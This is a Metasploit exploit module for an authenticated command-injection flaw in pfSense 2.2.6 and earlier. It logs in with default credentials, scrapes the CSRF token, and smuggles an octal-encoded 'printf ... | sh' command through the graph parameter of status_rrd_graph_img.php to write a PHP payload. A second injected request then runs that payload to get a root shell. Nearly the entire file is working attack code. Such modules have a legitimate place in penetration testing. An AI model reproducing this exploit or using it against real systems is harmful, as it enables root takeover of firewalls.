# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;        => &#039;pfSense authenticated graph status RCE&#039;,
        &#039;Description&#039; => %q(
          pfSense, a free BSD based open source firewall distribution,
          version <= 2.2.6 contains a remote command execution
          vulnerability post authentication in the _rrd_graph_img.php page.
          The vulnerability occurs via the graph GET parameter. A non-administrative
          authenticated attacker can inject arbitrary operating system commands
          and execute them as the root user. Verified against 2.1.3.
        ),
        &#039;Author&#039;      =>
          [
            &#039;Security-Assessment.com&#039;,   # discovery
            &#039;Milton Valencia (wetw0rk)&#039;, # metasploit module
            &#039;Jared Stephens (mvrk)&#039;,     # python script
          ],
        &#039;References&#039;  =>
          [
            [ &#039;EDB&#039;, &#039;39709&#039; ],
            [ &#039;URL&#039;, &#039;http://www.security-assessment.com/files/documents/advisory/pfsenseAdvisory.pdf&#039;]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Privileged&#039;     => true,
        &#039;DefaultOptions&#039; =>
          {
            &#039;SSL&#039;         => true,
            &#039;Encoder&#039;     => &#039;php/base64&#039;,
          },

        &#039;DisclosureDate&#039; => &#039;Apr 18, 2016&#039;,
        &#039;Platform&#039;       => &#039;php&#039;,
        &#039;Arch&#039;           => ARCH_PHP,
        &#039;Targets&#039;        => [[ &#039;Automatic Target&#039;, { }]],
        &#039;DefaultTarget&#039;  => 0,
      )
    )

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;,  [ true, &#039;User to login with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [ false, &#039;Password to login with&#039;, &#039;pfsense&#039;]),
        Opt::RPORT(443)
      ], self.class
    )
  end

  def login

    res = send_request_cgi(
      &#039;uri&#039;    => &#039;/index.php&#039;,
      &#039;method&#039; => &#039;GET&#039;
    )

    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 200

    /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_status("CSRF Token for login: #{csrf}")

    cookie = "PHPSESSID=#{res.get_cookies_parsed[&#039;PHPSESSID&#039;][0]}; cookie_test=#{res.get_cookies_parsed[&#039;cookie_test&#039;][0]};"

    res = send_request_cgi(
      &#039;uri&#039;        => &#039;/index.php&#039;,
      &#039;method&#039;      => &#039;POST&#039;,
      &#039;headers&#039;     => {
        &#039;User-Agent&#039;                => &#039;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&#039;,
        &#039;Accept&#039;                    => &#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,
        &#039;Accept-Language&#039;           => &#039;en-US,en;q=0.5&#039;,
        &#039;Accept-Encoding&#039;           => &#039;gzip, deflate&#039;,
        &#039;Referer&#039;                   => "https://#{rhost}/index.php",
        &#039;Cookie&#039;                    => cookie,
        &#039;Connection&#039;                => &#039;close&#039;,
        &#039;Upgrade-Insecure-Requests&#039; => &#039;1&#039;,
      },
      &#039;vars_post&#039;  => {
        &#039;__csrf_magic&#039; => csrf,
        &#039;usernamefld&#039;  => datastore[&#039;USERNAME&#039;],
        &#039;passwordfld&#039;  => datastore[&#039;PASSWORD&#039;],
        &#039;login&#039;        => &#039;Login&#039;
      }
    )

    unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to authentication request")
    end
    if res.code == 302
      print_status(&#039;Authentication successful continuing exploitation&#039;)
      return cookie
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed: #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      return nil
    end
  end

  def exploit
    begin
      cookie   = login
      filename = Rex::Text.to_rand_case("PaasdnatEoomaBb")

      stager = "echo \&#039;<?php "
      stager << payload.encode
      stager << "?>\&#039; > #{filename}"
      # here we begin the encoding process to
      # convert the payload to octal! Ugly code
      # don&#039;t look
      complete_stage = ""
      for i in 0..(stager.length()-1)
        complete_stage << "\\#{stager[i].ord.to_s(8)}"
      end

      print_status("Attempting to upload the initial payload as #{filename}")
      res = send_request_raw(
        &#039;uri&#039;      => "/status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf%20%27#{complete_stage}%27|sh|echo",
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;headers&#039;  => {
          &#039;User-Agent&#039;      => &#039;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&#039;,
          &#039;Accept&#039;          => &#039;*/*&#039;,
          &#039;Accept-Language&#039; => &#039;en-US,en;q=0.5&#039;,
          &#039;Accept-Encoding&#039; => &#039;gzip, deflate&#039;,
          &#039;Origin&#039;          => &#039;null&#039;,
          &#039;Cookie&#039;          => cookie,
          &#039;Connection&#039;      => &#039;close&#039;,
        }
      )

      if res && res.code == 200
        print_good("Triggering the vulnerability, root shell incoming...")
      else
        print_error("Failed upload the initial payload...")
      end

      res = send_request_cgi({
        &#039;uri&#039;     => &#039;/status_rrd_graph_img.php&#039;,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;headers&#039; => {
          &#039;User-Agent&#039;                => &#039;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&#039;,
          &#039;Accept&#039;                    => &#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,
          &#039;Accept-Language&#039;           => &#039;en-US,en;q=0.5&#039;,
          &#039;Accept-Encoding&#039;           => &#039;gzip, deflate&#039;,
          &#039;Cookie&#039;                    => cookie,
          &#039;Connection&#039;                => &#039;close&#039;,
          &#039;Upgrade-Insecure-Requests&#039; => &#039;1&#039;,
        },
        &#039;vars_get&#039; => {
          &#039;database&#039; => &#039;-throughput.rrd&#039;,
          &#039;graph&#039;    => "file|php #{filename}|echo #"
        }
      })
      disconnect
    end
  end
end

